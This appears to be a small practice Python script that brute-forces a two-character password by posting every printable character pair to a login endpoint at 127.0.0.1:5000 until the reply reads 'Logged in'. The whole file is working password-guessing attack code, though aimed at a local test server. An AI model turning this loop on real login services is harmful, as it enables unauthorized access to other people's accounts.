import requests
import string




def bruteForce():
    asciiLetters = string.printable
    for letter1 in asciiLetters:
        for letter2 in asciiLetters:
            password = (letter1 + letter2)
            r = requests.post('http://127.0.0.1:5000/', json={"password": password})
            if(r.json()['Message'] == "Logged in"):
                return password

print("Password is: " + bruteForce())
            

